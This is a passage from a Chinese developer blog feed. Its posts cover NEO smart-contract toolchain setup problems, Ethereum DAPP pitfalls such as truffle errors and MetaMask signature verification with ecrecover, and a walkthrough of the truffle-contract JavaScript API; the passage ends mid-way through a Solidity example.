    <content type="html"><![CDATA[<p>— NEO教程真的坑啊 —</p><a id="more"></a><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DAPP要迁移到NEO…找了整整两天资料真的是想死，教程几乎是没有的，用户是很少的，文档是没有的，有也是老外写的，哎….</p><p>看着<a href="http://docs.neo.org/zh-cn/sc/quickstart/getting-started-java.html" target="_blank" rel="noopener">官网教程</a>弄的，但是有诸多坑</p><hr><h1 id="neo-compiler-gt-neoj"><a href="#neo-compiler-gt-neoj" class="headerlink" title="neo-compiler -&gt; neoj"></a>neo-compiler -&gt; neoj</h1><p>编译生成用于把<code>.class</code>变为虚拟机字节码的<code>neoj</code></p><h2 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h2><ul><li>对照官网教程，发布配置没有<code>netcoreapp2.0</code>选项，没有<code>部署模式</code>选项</li><li>编译结果没有<code>.exe</code></li></ul><p>neoj项目 右键属性 -&gt; 改为目标框架 <code>.NET Core 2.0</code> 输出类型 <code>windows 应用程序</code></p><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fu85m31589j30jl08zaad.jpg" alt="bug3.png"></p><h2 id="坑2"><a href="#坑2" class="headerlink" title="坑2"></a>坑2</h2><p>编译生成的<code>neoj.exe</code> win7 下报错</p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fu85ltih9lj30gp03n3yk.jpg" alt="bug1.png"></p><p>发布配置中可以改为win7*64</p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fu85lz71fpj30el09qglr.jpg" alt="bug2.png"></p><p>最终OK</p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fu85m7p83gj308a01kwea.jpg" alt="bug4.png"></p><hr><h1 id="neo-devpack-java-gt-jar包"><a href="#neo-devpack-java-gt-jar包" class="headerlink" title="neo-devpack-java -&gt; jar包"></a>neo-devpack-java -&gt; jar包</h1><p>java合约编写 与 neoj 需要使用的jar包</p><h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>由于我是迁移了<code>neoj.exe</code>的位置，所以按照官网导出会显示找不到文件</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fu85mcbb7bj30fr05uglx.jpg" alt="bug5.png"></p><p>我把 <code>\neoj\bin\Release\PublishOutput</code>(就是有neoj.exe的文件) 放到了别的地方 重命名为<code>neoj</code>文件夹</p><p>这里需要将 <code>neo-devpack-java</code> 中的 <code>org.neo.smartcontract.framework</code> 包 导出的 <code>org.neo.smartcontract.framework.jar</code> 放在<code>neoj</code>文件夹目录下就可以解决问题。</p><p>虽然我觉得官网教程中的 jar包在<code>\neoj\bin\Release\netcoreapp1.1\win10-x64\publish\</code> ，neoj.exe在<code>\neoj\bin\Release\PublishOutput</code>，neoj.exe也是找不到会报错的，但是懒得去试了，总之都丢到一个文件夹下，neoj才是真正可以用了</p><hr><h1 id="创建项目引入包"><a href="#创建项目引入包" class="headerlink" title="创建项目引入包"></a>创建项目引入包</h1><h2 id="坑1-1"><a href="#坑1-1" class="headerlink" title="坑1"></a>坑1</h2><p>创建一个neo合约项目，需要引入包之前编译的jar包，被官网教程各种误导<br>官网截图的引入包很奇怪,根本不是上面编译生成的<code>org.neo.smartcontract.framework.jar</code>而是一个<code>neo-contract.jar</code>的文件</p><p>我感觉是有问题的，也没管那么多，引入放在<code>neoj.exe</code>同目录下的<code>org.neo.smartcontract.framework.jar</code></p><p>按照官网教程的代码，编译转化，成功</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fu85mf9myrj30b002ejr8.jpg" alt="bug6.png"></p><h2 id="坑2-1"><a href="#坑2-1" class="headerlink" title="坑2"></a>坑2</h2><p>但是后来发现当需要引入其他包的文件时，就会出错。比如<code>neo.runtime</code>等等</p><p>这些函数并不在<code>org.neo.smartcontract.framework</code>里面，而在<code>neo-devpack-java</code>项目的其他包中。</p><p>解决办法：</p><ul><li>直接在<code>neo-devpack-java</code>项目内新建一个自己的包，直接引用其他包，就不需要编译了。</li><li>导出<code>neo-devpack-java</code>所有其他包变为一个jar（现在知道那个neo-contract.jar是哪来的，就是这一个包，但是竟然没有说明啊啊啊），jar导入到新创建的neo合约项目，就可以使用了</li></ul><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>导出 org.neo.smartcontract.framework 程序包，只是为了给 neoj 使用</li><li>java内的编写合约引用包，需要neo-devpack-java所有包</li><li>合约写完编译后成<code>.java</code>后，再用neoj转化为<code>.avm</code>，再用neo-gui发布</li></ul><p>如此才是真正的环境弄完了。。。</p><p>但是….也并没有用java写…因为java例子太少了…哎…入坑c#也许更轻松…</p><hr><h1 id="c-环境"><a href="#c-环境" class="headerlink" title="c#环境"></a>c#环境</h1><p>本以为java弄好了挺好的，但是事实是java智能合约例子只有一个<br>官网API也是.net下c#的，教程也是c#的，就让人很头疼。</p><p>决定再三，还是去学一点c#，根据c#的例子来写智能合约</p><p>c# 的环境其实在经历过java环境搭建过后没有大坑。根据官网的也是比较详细的，根据它来就可以</p><h2 id="坑-1"><a href="#坑-1" class="headerlink" title="坑"></a>坑</h2><p>但是在编译 c#例子 的时候，两个需要触发事件的智能合约例子出了问题。</p><p>问题截图忘保存了，大致就是找不到一个叫<code>mscorlib.dll</code>的文件</p><p>但是，<code>dll</code>文件是生成了，编译是成功的，但是<code>neon xxx.dll</code>的时候出现了以上问题</p><blockquote><p>ps.当配置完环境后，c#开发智能合约利用官网的插件，是会在vs2017内直接编译成<code>.dll文件</code>，再调用neon命令直接转化为<code>avm文件</code></p></blockquote><p>在自己尝试后，发现只要把生成的几个dll文件（一般是两个，一个自己的<code>xxx.dll</code>，一个<code>Neo.SmartContract.Framework.dll</code>)，移动到neon文件夹的目录下用命令<code>./neno.exe xxx.dll</code>,就可以成功转换</p><p>就是目录下找不到一些所用的文件，但是此处只把<code>mscorlib.dll</code>的文件拷贝到<code>xxx.dll</code>同目录下也是不行的。可能他还依赖其他一些文件。找到替代方法，也没有继续研究了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— NEO教程真的坑啊 —&lt;/p&gt;
    
    </summary>
    
    
      <category term="NEO" scheme="http://lalajun.com/tags/NEO/"/>
    
      <category term="区块链" scheme="http://lalajun.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>DAPP开发中趟过的坑</title>
    <link href="http://lalajun.com/2018/08/07/DAPP%E5%BC%80%E5%8F%91%E4%B8%AD%E8%B6%9F%E8%BF%87%E7%9A%84%E5%9D%91/"/>
    <id>http://lalajun.com/2018/08/07/DAPP开发中趟过的坑/</id>
    <published>2018-08-07T10:27:12.000Z</published>
    <updated>2018-12-14T01:03:19.396Z</updated>
    
    <content type="html"><![CDATA[<p>— 用时间砸出来的经验之谈 —<br>— 记录下来、造福后Zi人Ji —<br><a id="more"></a></p><h1 id="issue-amp-answer"><a href="#issue-amp-answer" class="headerlink" title="issue &amp; answer"></a>issue &amp; answer</h1><h2 id="TestRPC-Runtime-Error-out-of-gas"><a href="#TestRPC-Runtime-Error-out-of-gas" class="headerlink" title="TestRPC Runtime Error: out of gas"></a>TestRPC Runtime Error: out of gas</h2><p>解决：<a href="https://blog.csdn.net/loy_184548/article/details/78070279" target="_blank" rel="noopener">别人的博客</a></p><h2 id="truffle-serve-——-fsevents-is-not-a-constructor"><a href="#truffle-serve-——-fsevents-is-not-a-constructor" class="headerlink" title="truffle serve ——  fsevents is not a constructor"></a>truffle serve ——  fsevents is not a constructor</h2><p>解决：<a href="https://github.com/trufflesuite/truffle/issues/448" target="_blank" rel="noopener">万能的Github</a></p><h2 id="windows-cmd-运行truffle命令与truffle-js冲突"><a href="#windows-cmd-运行truffle命令与truffle-js冲突" class="headerlink" title="windows cmd 运行truffle命令与truffle.js冲突"></a>windows cmd 运行truffle命令与truffle.js冲突</h2><p>放弃windows <code>cmd</code>，乱七八糟问题多，用 <code>git bash</code></p><h2 id="truffle-contract-链接-web3-1-0版本"><a href="#truffle-contract-链接-web3-1-0版本" class="headerlink" title="truffle-contract 链接 web3 1.0版本"></a>truffle-contract 链接 web3 1.0版本</h2><p>解决：<a href="https://github.com/trufflesuite/truffle-contract/issues/57" target="_blank" rel="noopener">万能的Github-1</a><br>解决：<a href="https://github.com/trufflesuite/truffle-contract/issues/56#issuecomment-331084530" target="_blank" rel="noopener">万能的Github-2</a></p><p>最终解决代码如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dirty hack for web3@1.0.0 support for localhost testrpc, see https://github.com/trufflesuite/truffle-contract/issues/56#issuecomment-331084530</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> self.contract.currentProvider.sendAsync !== <span class="string">"function"</span>) &#123;</span><br><span class="line">    self.contract.currentProvider.sendAsync = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> self.contract.currentProvider.send.apply(</span><br><span class="line">        self.contract.currentProvider, <span class="built_in">arguments</span></span><br><span class="line">    );</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="metamask签名-智能合约中-验证签名-的坑"><a href="#metamask签名-智能合约中-验证签名-的坑" class="headerlink" title="metamask签名 智能合约中 验证签名 的坑"></a>metamask签名 智能合约中 验证签名 的坑</h2><p><strong>metamask</strong>中的web3 的 <strong>web3.eth.sign</strong> 与 <strong>web3.personal.sign</strong> 两种签名方式用同一账户地址对于同一数据的签名结果是不同的（我也完全不知道为什么啊啊啊啊！）<br>然后<strong>智能合约</strong>中用<code>ecrecover</code>进行验证</p><p><code>web3.personal.sign(密文，签名地址，回调函数)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web3.personal.sign(<span class="string">"0x19cdf95a071009070a345dd7ffd30ee7f18eee008f4f5d49945c1e2328c53e9d"</span>,<span class="string">"0x18c61a12a369d91277ace3fd1c127a7f270d5d3b"</span>,<span class="built_in">console</span>.log)</span><br><span class="line"><span class="comment">//err + result</span></span><br><span class="line"><span class="comment">// null "0x1ed1a91cfb8fb0fe77d63f2f6fbf12f789bdcf88c11f8e4ffc023f2fd61e7c264b1c59a79668eb698902d0043b9a0a3ee16165d3d57dc0a29dde61de8e8e687d1b"</span></span><br></pre></td></tr></table></figure></p><p><code>web3.eth.sign(签名地址,密文，回调函数)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sign(<span class="string">"0x18c61a12a369d91277ace3fd1c127a7f270d5d3b"</span>,</span><br><span class="line"><span class="string">"0x19cdf95a071009070a345dd7ffd30ee7f18eee008f4f5d49945c1e2328c53e9d"</span>,<span class="built_in">console</span>.log)</span><br><span class="line"><span class="comment">//err + result</span></span><br><span class="line"><span class="comment">// null "0x541959986ccc60b5a5ba5bf90535b5e1d372972413306df4d67c6224f79e585e4ff598da3c700965a70ff204ded769b3261ff67214b2d4fa955ee3dbaad76a301b"</span></span><br></pre></td></tr></table></figure></p><p>js中进行分解signature<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> signature = req.query.signature.slice(<span class="number">2</span>,<span class="number">132</span>) <span class="comment">//去除0x</span></span><br><span class="line"><span class="keyword">var</span> r = <span class="string">"0x"</span>+signature.slice(<span class="number">0</span>,<span class="number">64</span>);</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">"0x"</span>+signature.slice(<span class="number">64</span>,<span class="number">128</span>);</span><br><span class="line"><span class="keyword">var</span> v = <span class="built_in">parseInt</span>(signature.slice(<span class="number">128</span>,<span class="number">130</span>),<span class="number">16</span>);  <span class="comment">//转为int形式 ，此处产生的v 直接就为27或28</span></span><br></pre></td></tr></table></figure></p><p>智能合约中的<code>ecrecover</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//uint8 v, bytes32 r, bytes32 s</span></span><br><span class="line">address addr = ecrecover(hashOfMsg, v, r, s);</span><br></pre></td></tr></table></figure></p><blockquote><p>关键的来了！<br>智能合约中的<code>ecrecover</code>是识别metamask中的web3.eth.sign<br>而不识别web3.personal.sign!!!!!!!!!!!!<br>不识别的意思是验证时，结果不一样！</p></blockquote><p>结论：<strong>智能合约中的<code>ecrecover</code>是识别metamask中的web3.eth.sign</strong></p><hr><p>2018.12.12更新：<br>今天有个老哥找到我问了<code>web3.personal.sign</code>该如何解密。<br>当初是绕过了这个问题，没有继续研究了，讨论了下，这个签名与验证用在一些dapp的快速登录中，形成的登录效果极其方便。<br>这里找到了网上用js做前端后端实现使用metamask快速登录的例子，在后端验证时是调用的<code>eth-sig-util</code>库的<code>recoverPersonalSignature (msgParams)</code>(当然并不是在智能合约中解决了<code>web3.personal.sign</code>的验证问题)<br>留个储备链接以防以后需要：<br><a href="https://www.toptal.com/ethereum/one-click-login-flows-a-metamask-tutorial#utilize-unreal-developers-today" target="_blank" rel="noopener">en原文</a><br><a href="https://windcoder.com/qukuailianyijiandenglumetamaskjiaocheng" target="_blank" rel="noopener">译文</a><br><a href="https://github.com/amaurymartiny/login-with-metamask-demo" target="_blank" rel="noopener">demo-github地址</a><br><a href="http://npm.taobao.org/package/eth-sig-util" target="_blank" rel="noopener">eth-sig-util包</a></p><p>那位老哥找到了如何解密的办法：源码如下：<br><code>personal.sign()</code>:</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fy5zwedgzcj31090aujrp.jpg" alt></p><p><code>eth.sign()</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fy5zxn9rofj316109n3zz.jpg" alt></p><h2 id="智能合约与JS中的sha256"><a href="#智能合约与JS中的sha256" class="headerlink" title="智能合约与JS中的sha256"></a>智能合约与JS中的sha256</h2><p>当在在智能合约中用到的<code>ecrecover(hashOfMsg, v, r, s)</code></p><p>智能合约中的<code>sha256(address)</code>。address是作为bytes进行sha256；<br>在js中的<code>sha256(&quot;0x123&quot;)</code>是作为字符串形式进行sha256。</p><p>两者的结果不同，如果需要相同，需要在js中修改<code>&quot;0x123&quot;</code>为bytes形式进行sha256</p><h2 id="truffle寻找合约地址"><a href="#truffle寻找合约地址" class="headerlink" title="truffle寻找合约地址"></a>truffle寻找合约地址</h2><p>如何在truffle中找到部署合约的合约地址？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Web3 = <span class="built_in">require</span>(<span class="string">'web3'</span>);</span><br><span class="line"><span class="keyword">var</span> contract = <span class="built_in">require</span>(<span class="string">'truffle-contract'</span>);</span><br><span class="line"><span class="comment">//引入合约 以及 配置</span></span><br><span class="line"><span class="keyword">var</span> ConContract = <span class="built_in">require</span>(<span class="string">'../../contracts/Coin.json'</span>);</span><br><span class="line"><span class="comment">//链接到以太坊节点</span></span><br><span class="line"><span class="keyword">var</span> web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">'http://localhost:7545'</span>));</span><br><span class="line"><span class="keyword">const</span> Cont = &#123;</span><br><span class="line">    <span class="comment">//地址</span></span><br><span class="line">    contract: <span class="literal">null</span>,</span><br><span class="line">    <span class="comment">//合约</span></span><br><span class="line">    instance: <span class="literal">null</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化链接到以太坊节点</span></span><br><span class="line">    init: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> self = <span class="keyword">this</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        self.contract = contract(ConContract)</span><br><span class="line">        self.contract.setProvider(web3.currentProvider)</span><br><span class="line">        self.contract.deployed().then(<span class="function"><span class="params">instance</span> =&gt;</span> &#123;</span><br><span class="line">            self.instance = instance</span><br><span class="line">            resolve()</span><br><span class="line">        &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">            reject(err)</span><br><span class="line">        &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = Cont;</span><br></pre></td></tr></table></figure><p>如此初始化合约，合约地址在<code>Cont.instance.address</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 用时间砸出来的经验之谈 —&lt;br&gt;— 记录下来、造福后Zi人Ji —&lt;br&gt;
    
    </summary>
    
    
      <category term="智能合约" scheme="http://lalajun.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
      <category term="DAPP" scheme="http://lalajun.com/tags/DAPP/"/>
    
      <category term="血泪教训" scheme="http://lalajun.com/tags/%E8%A1%80%E6%B3%AA%E6%95%99%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>Truffle-Contract中间件</title>
    <link href="http://lalajun.com/2018/08/07/truffle_contact/"/>
    <id>http://lalajun.com/2018/08/07/truffle_contact/</id>
    <published>2018-08-07T10:17:12.000Z</published>
    <updated>2018-08-07T10:14:20.861Z</updated>
    
    <content type="html"><![CDATA[<p>— Truffle-Contract安装&amp;使用 —<br>—     连接 MetaMask钱包    —<br><a id="more"></a></p><h1 id="truffle-contact"><a href="#truffle-contact" class="headerlink" title="truffle-contact"></a>truffle-contact</h1><p><strong>truffle-contact</strong> 是一个基于web3的链接网络中智能合约的JS中间组件，利用它可以方便调用合约<br><a href="https://github.com/trufflesuite/truffle-contract" target="_blank" rel="noopener">官方英文文档</a></p><h2 id="安装-引入"><a href="#安装-引入" class="headerlink" title="安装/引入"></a>安装/引入</h2><p>安装：<br><code>npm install truffle-contract</code><br><code>npm install web3</code><br>引入：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"./path/to/web3.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"./dist/truffle-contract.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="链接至合约"><a href="#链接至合约" class="headerlink" title="链接至合约"></a>链接至合约</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.新建一个web3驱动</span></span><br><span class="line"><span class="keyword">var</span> provider = <span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">"http://localhost:8545"</span>);</span><br><span class="line"><span class="comment">//2.引入truffle-contract包</span></span><br><span class="line"><span class="keyword">var</span> contract = <span class="built_in">require</span>(<span class="string">"truffle-contract"</span>);</span><br><span class="line"><span class="comment">//3.1.输入是一个被定义为truffle0contract-schema的JSON blob</span></span><br><span class="line"><span class="keyword">var</span> MyContract = contract(&#123;</span><br><span class="line">  abi: ...,</span><br><span class="line">  unlinked_binary: ...,</span><br><span class="line">  address: ..., <span class="comment">// optional</span></span><br><span class="line">  <span class="comment">// many more</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//3.2.当引入是js包时，默认名称为TruffleContract</span></span><br><span class="line"><span class="keyword">var</span> MyContract = TruffleContract(...);</span><br><span class="line"><span class="comment">//4.配置驱动链接至链</span></span><br><span class="line">MyContract.setProvider(provider);</span><br></pre></td></tr></table></figure><p>你能使用<code>MyContract</code>中的以下函数来连接至链：</p><ul><li><code>at()</code>：创建一个MyContract实例在特定的位置</li><li><code>deployed()</code>：创建一个MyContract实例在合约默认的位置</li><li><code>new()</code>：部署一个此智能合约的新版本到网络，获取这个新的合约实例</li></ul><h2 id="合约抽象类"><a href="#合约抽象类" class="headerlink" title="合约抽象类"></a>合约抽象类</h2><p>链接至链上合约，可以查看合约返给我们的<code>合约抽象类</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意用.then 使用回调函数</span></span><br><span class="line">MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(instance);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Contract</span></span><br><span class="line"><span class="comment">// - address: "0xa9f441a487754e6b27ba044a5a8eb2eec77f6b92"</span></span><br><span class="line"><span class="comment">// - allEvents: ()</span></span><br><span class="line"><span class="comment">// - getBalance: ()</span></span><br><span class="line"><span class="comment">// - getBalanceInEth: ()</span></span><br><span class="line"><span class="comment">// - sendCoin: ()</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></p><p>这里会有部署合约的地址，合约的函数等等内容，可以由此来调用合约中的函数</p><h2 id="truffle-contract-API"><a href="#truffle-contract-API" class="headerlink" title="truffle-contract API"></a>truffle-contract API</h2><p>在说明如何调用合约之前，以<code>MyContract</code>为例，详细说明truffle-contract自带的其他函数</p><h3 id="MyContract-new-arg1-arg2-…-tx-params"><a href="#MyContract-new-arg1-arg2-…-tx-params" class="headerlink" title="MyContract.new([arg1, arg2, …], [tx params])"></a>MyContract.new([arg1, arg2, …], [tx params])</h3><p><strong>作用</strong>：将合约的一个新实例部署到网络中<br><strong>输入参数</strong>：这个函数接受contract需要的任何参数。最后有一个可选参数，可传递交易参数，包括发起地址，gas限制，gas价格等。<br><strong>返回</strong>：返回包含一个在新的地址部署的合约 的合约抽象类 的Promise</p><h3 id="MyContract-at-address"><a href="#MyContract-at-address" class="headerlink" title="MyContract.at(address)"></a>MyContract.at(address)</h3><p><strong>作用</strong>：从链上特定的地址上创建一个新的合约实例<br><strong>输入参数</strong>：一个新的地址<br><strong>返回</strong>：返回一个新的合约实例</p><h3 id="MyContract-deployed"><a href="#MyContract-deployed" class="headerlink" title="MyContract.deployed()"></a>MyContract.deployed()</h3><p><strong>作用</strong>：从默认地址创建一个新的合约实例。该默认地址是提供给truffle-contract的参数，对应对应的链<br><strong>输入参数</strong>：一个新的地址<br><strong>返回</strong>：返回一个新的合约实例</p><h3 id="MyContract-link-instance"><a href="#MyContract-link-instance" class="headerlink" title="MyContract.link(instance)"></a>MyContract.link(instance)</h3><p><strong>作用</strong>：连接一个合约虚拟实例的库到MyContract。库必须已经被部署，并拥有部署地址。并且可以从该合约虚拟实例中推断出名称跟部署地址<br><strong>输入参数</strong>：一个已经部署的合约虚拟实例<br><strong>返回</strong>：在这个交易的结果中，报告所有合约虚拟实例库的事件？</p><p><code>MyContract.link(name, address)</code></p><p><code>MyContract.link(object)</code></p><blockquote><p>此处不太明白link的作用，差不多是拷贝吧，当用到时，再补充说明</p></blockquote><h3 id="MyContract-networks"><a href="#MyContract-networks" class="headerlink" title="MyContract.networks()"></a>MyContract.networks()</h3><p><strong>作用</strong>：查看MyContract的已经设置为代表的网络id列表<br><strong>返回</strong>：网络id列表</p><h3 id="MyContract-setProvider-provider"><a href="#MyContract-setProvider-provider" class="headerlink" title="MyContract.setProvider(provider)"></a>MyContract.setProvider(provider)</h3><p><strong>作用</strong>：设置MyContract将要使用的web3驱动<br><strong>输入参数</strong>：web3的provider</p><h3 id="MyContract-setNetwork-network-id"><a href="#MyContract-setNetwork-network-id" class="headerlink" title="MyContract.setNetwork(network_id)"></a>MyContract.setNetwork(network_id)</h3><p><strong>作用</strong>：设置MyContract当前代表网络id<br><strong>输入参数</strong>：网络id</p><h3 id="MyContract-hasNetwork-network-id"><a href="#MyContract-hasNetwork-network-id" class="headerlink" title="MyContract.hasNetwork(network_id)"></a>MyContract.hasNetwork(network_id)</h3><p><strong>作用</strong>：判断MyContract是否连接上这个网络<br><strong>输入参数</strong>：网络id<br><strong>返回</strong>：返回布尔型；是/否</p><h3 id="MyContract-defaults-new-defaults"><a href="#MyContract-defaults-new-defaults" class="headerlink" title="MyContract.defaults([new_defaults])"></a>MyContract.defaults([new_defaults])</h3><p><strong>作用</strong>：为从MyContract创建的所有实例设置事务默认值<br><strong>输入参数</strong>：设置的默认值<br><strong>返回</strong>：没有输入参数时，返回当前事务默认值<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置新的默认值</span></span><br><span class="line">MyContract.defaults(&#123;</span><br><span class="line">  <span class="keyword">from</span>: ...,</span><br><span class="line">  gas: ...,</span><br><span class="line">  gasPrice: ...,</span><br><span class="line">  value: ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><blockquote><p>此处设置可以省略在调用智能合约时的每次指定from，gas等</p></blockquote><h3 id="MyContract-clone-network-id"><a href="#MyContract-clone-network-id" class="headerlink" title="MyContract.clone(network_id)"></a>MyContract.clone(network_id)</h3><p><strong>作用</strong>：从当前MyContract克隆一个合约虚拟实例到新的网络id（别忘了，之后指定新的provider）<br><strong>输入参数</strong>：network_id<br><strong>返回</strong>：一个新的合约虚拟实例<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyOtherContract = MyContract.clone(<span class="number">1337</span>);</span><br></pre></td></tr></table></figure></p><h2 id="与合约中函数的交互"><a href="#与合约中函数的交互" class="headerlink" title="与合约中函数的交互"></a>与合约中函数的交互</h2><p>其中与合约函数交互有两种形式：<code>transaction</code> 和 <code>call</code><br>以下为实例合约<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">"./ConvertLib.sol"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// This is just a simple example of a coin-like contract.</span></span><br><span class="line"><span class="comment">// It is not standards compatible and cannot be expected to talk to other</span></span><br><span class="line"><span class="comment">// coin/token contracts. If you want to create a standards-compliant</span></span><br><span class="line"><span class="comment">// token, see: https://github.com/ConsenSys/Tokens. Cheers!</span></span><br><span class="line"> </span><br><span class="line">contract MetaCoin &#123;</span><br><span class="line">  <span class="comment">//映射</span></span><br><span class="line">mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  <span class="comment">//转账事件</span></span><br><span class="line">event Transfer(address indexed _from, address indexed _to, uint256 _value);</span><br><span class="line">  <span class="comment">//控制器，创建合约时运行</span></span><br><span class="line"><span class="keyword">constructor</span>() public &#123;</span><br><span class="line">balances[tx.origin] = <span class="number">10000</span>;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">//代币转账函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendCoin</span>(<span class="params">address 